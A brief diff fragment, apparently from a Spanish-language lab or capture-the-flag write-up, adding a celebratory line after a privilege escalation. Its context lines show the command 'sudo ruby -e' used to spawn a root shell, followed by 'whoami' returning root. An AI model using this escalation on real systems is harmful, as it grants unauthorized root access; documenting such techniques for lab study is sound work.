@@ -249,3 +249,4 @@ $ sudo ruby -e 'exec "/bin/sh"'
 # whoami
 root
 ````
+🥳CONSEGUIDO, SOMOS ROOT🥳
